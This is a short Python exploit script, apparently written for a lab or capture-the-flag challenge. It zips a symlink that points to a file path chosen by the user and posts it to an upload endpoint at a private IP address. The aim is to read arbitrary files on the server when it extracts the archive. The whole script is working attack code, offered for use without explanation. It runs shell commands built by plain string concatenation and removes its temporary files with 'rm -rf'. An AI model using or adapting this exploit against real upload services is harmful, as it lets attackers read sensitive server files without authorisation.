#coding=utf-8
import os
import requests
import sys

url = 'http://192.168.48.130:10008/upload'
def makezip():
    os.system('ln -s '+sys.argv[1]+' exp')
    os.system('zip --symlinks exp.zip exp')
makezip()

files = {'the_file':open('./exp.zip','rb')}
def exploit():
    res = requests.post(url,files=files)
    print(res.text)

exploit()
os.system('rm -rf exp')
os.system('rm -rf exp.zip')
